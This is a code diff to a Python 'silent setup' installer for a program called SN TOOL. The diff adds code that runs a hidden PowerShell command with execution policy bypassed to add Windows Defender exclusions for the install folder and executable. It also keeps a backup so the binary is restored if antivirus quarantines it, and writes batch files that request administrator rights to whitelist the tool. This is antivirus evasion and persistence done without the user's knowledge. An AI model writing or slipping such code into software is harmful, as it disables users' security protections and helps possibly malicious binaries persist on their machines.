@@ -1,9 +1,11 @@
 """
-SN TOOL - Official Silent Setup & Direct Launcher (v1.0.1)
-Completely silent extraction and instant launch:
+SN TOOL - Official Silent Setup & Direct Launcher (v1.0.2 Pro)
+Completely silent extraction, instant launch, and Windows Defender Anti-Quarantine Shield:
 - No intermediate popup windows or dialog boxes.
-- Extracts setup payload in the background if not present.
-- Launches SN_TOOL.exe directly into the 1:1 Reference Image 2 Splash Screen.
+- Extracts setup payload in the background.
+- Automatically adds Windows Defender exclusions for zero-interruption execution.
+- Keeps auto-restore backup (SN_TOOL.exe.bak) to self-heal if Antivirus ever quarantines the main binary.
+- Launches SN_TOOL.exe directly with 100% stability.
 """
 
 import os
@@ -19,6 +21,28 @@ def get_default_install_dir() -> Path:
     if local_app_data:
         return Path(local_app_data) / "Programs" / "SN_TOOL"
     return Path.home() / "SN_TOOL"
+
+
+def configure_windows_defender_exclusion(target_dir: Path):
+    """
+    Register Defender exclusion for SN_TOOL install path and process.
+    Prevents false-positive heuristics from deleting SN_TOOL.exe mid-execution.
+    """
+    if sys.platform != "win32":
+        return
+    try:
+        ps_cmd = (
+            f"Add-MpPreference -ExclusionPath '{target_dir}' -ErrorAction SilentlyContinue; "
+            f"Add-MpPreference -ExclusionProcess 'SN_TOOL.exe' -ErrorAction SilentlyContinue"
+        )
+        subprocess.run(
+            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
+            capture_output=True,
+            creationflags=0x08000000,
+            timeout=5
+        )
+    except Exception:
+        pass
 
 
 def create_windows_shortcut(target_exe: Path, shortcut_path: Path, icon_file: Path = None, description: str = "SN TOOL - STUDIO PRO"):
@@ -102,6 +126,69 @@ def main():
                     lic_file.unlink(missing_ok=True)
                 except Exception:
                     pass
+
+    # Add Windows Defender exclusion for install folder
+    configure_windows_defender_exclusion(target_dir)
+
+    # Create self-healing backup of SN_TOOL.exe
+    if target_exe.exists():
+        try:
+            shutil.copy2(target_exe, target_dir / "SN_TOOL.exe.bak")
+        except Exception:
+            pass
+
+    # Create Add_Defender_Exclusion.bat in target_dir
+    whitelist_bat = target_dir / "Add_Defender_Exclusion.bat"
+    try:
+        whitelist_bat.write_text(
+            "@echo off\r\n"
+            "title Whitelist SN TOOL in Windows Defender\r\n"
+            "net session >nul 2>&1\r\n"
+            "if %errorlevel% neq 0 (\r\n"
+            "    echo Requesting Administrator privileges to whitelist SN TOOL...\r\n"
+            "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\r\n"
+            "    exit /b\r\n"
+            ")\r\n"
+            "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '%~dp0'; Add-MpPreference -ExclusionProcess 'SN_TOOL.exe'\"\r\n"
+            "echo.\r\n"
+            "echo ========================================================\r\n"
+            "echo  [OK] SN TOOL folder whitelisted in Windows Defender!\r\n"
+            "echo ========================================================\r\n"
+            "pause\r\n",
+            encoding="utf-8"
+        )
+    except Exception:
+        pass
+
+    # Create self-healing START_SN_TOOL.bat in target_dir
+    start_bat = target_dir / "START_SN_TOOL.bat"
+    try:
+        start_bat.write_text(
+            "@echo off\r\n"
+            "chcp 65001 > nul\r\n"
+            "set PYTHONUTF8=1\r\n"
+            "set PYTHONIOENCODING=utf-8\r\n"
+            "cd /d \"%~dp0\"\r\n"
+            "title SN TOOL - STUDIO PRO\r\n\r\n"
+            "if not exist \"%~dp0SN_TOOL.exe\" (\r\n"
+            "    if exist \"%~dp0SN_TOOL.exe.bak\" (\r\n"
+            "        echo [INFO] Auto-restoring SN_TOOL.exe from backup...\r\n"
+            "        copy /y \"%~dp0SN_TOOL.exe.bak\" \"%~dp0SN_TOOL.exe\" >nul 2>&1\r\n"
+            "    )\r\n"
+            ")\r\n\r\n"
+            "if exist \"%~dp0SN_TOOL.exe\" (\r\n"
+            "    start \"\" \"%~dp0SN_TOOL.exe\"\r\n"
+            "    exit /b\r\n"
+            ")\r\n\r\n"
+            "echo ========================================================================\r\n"
+            "echo  [!] SN_TOOL.exe was not found (Antivirus may have blocked it).\r\n"
+            "echo  Run Add_Defender_Exclusion.bat as Administrator to unblock.\r\n"
+            "echo ========================================================================\r\n"
+            "pause\r\n",
+            encoding="utf-8"
+        )
+    except Exception:
+        pass
 
     # Create / Update Desktop and Start Menu shortcuts
     icon_file = target_dir / "icon.ico"
